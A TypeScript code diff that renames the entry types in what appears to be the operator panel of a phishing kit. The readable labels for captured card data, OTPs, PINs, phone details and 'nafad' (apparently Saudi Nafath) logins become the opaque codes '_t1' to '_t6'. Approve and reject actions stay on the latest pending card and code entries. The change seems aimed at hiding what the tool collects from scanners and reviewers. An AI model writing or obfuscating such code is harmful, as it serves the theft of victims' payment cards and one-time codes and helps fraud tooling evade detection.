@@ -4,7 +4,7 @@
 
 export interface HistoryEntry {
   id: string
-  type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad"
+  type: "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6"
   timestamp: string
   status: "pending" | "approved" | "rejected"
   data: any
@@ -138,19 +138,19 @@ export function convertHistoryToBubbles(history: HistoryEntry[]): BubbleData[] {
     let formattedData: Record<string, any> = {}
     
     switch (entry.type) {
-      case "card":
+      case "_t1":
         formattedData = formatCardData(entry)
         break
-      case "otp":
+      case "_t2":
         formattedData = formatOtpData(entry)
         break
-      case "pin":
+      case "_t3":
         formattedData = formatPinData(entry)
         break
-      case "phone_info":
+      case "_t4":
         formattedData = formatPhoneInfoData(entry)
         break
-      case "phone_otp":
+      case "_t5":
         formattedData = formatPhoneOtpData(entry)
         break
       default:
@@ -164,7 +164,7 @@ export function convertHistoryToBubbles(history: HistoryEntry[]): BubbleData[] {
       timestamp: entry.timestamp,
       status: entry.status,
       type: entry.type,
-      showActions: isLatest && entry.status === "pending" && (entry.type === "card" || entry.type === "otp" || entry.type === "phone_otp"),
+      showActions: isLatest && entry.status === "pending" && (entry.type === "_t1" || entry.type === "_t2" || entry.type === "_t5"),
       isLatest
     })
   })
